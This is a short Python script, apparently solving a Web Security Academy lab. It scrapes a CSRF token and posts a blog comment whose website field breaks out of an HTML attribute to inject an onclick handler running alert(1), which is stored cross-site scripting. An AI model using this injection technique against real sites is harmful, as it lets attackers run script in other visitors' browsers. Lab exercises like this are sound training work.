import requests
from bs4 import BeautifulSoup
s = requests.Session()
site = 'ac111fb01ebbc12b802a09a2009b0084.web-security-academy.net'

blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''Hello'''
comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : comment_string,
    'name' : 'Chance',
    'email' : 'spurgeonc@sou.edu',
    'website': '''https://sou.edu" SOUId="spurgeonc" onclick="javascript:alert(1)'''
}
resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)